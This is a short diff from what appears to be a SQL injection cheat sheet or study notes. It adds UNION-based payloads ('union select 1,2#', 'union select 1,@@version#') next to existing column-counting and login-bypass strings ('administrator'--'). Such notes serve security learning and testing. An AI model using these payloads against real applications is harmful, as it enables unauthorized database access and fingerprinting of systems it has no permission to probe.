@@ -32,3 +32,12 @@ administrator'--
   ```sh
   order by 2#
   ```
+
+  ```sh
+  union select 1,2#
+  ```
+
+  ```sh
+  union select 1,@@version#
+  ```
+
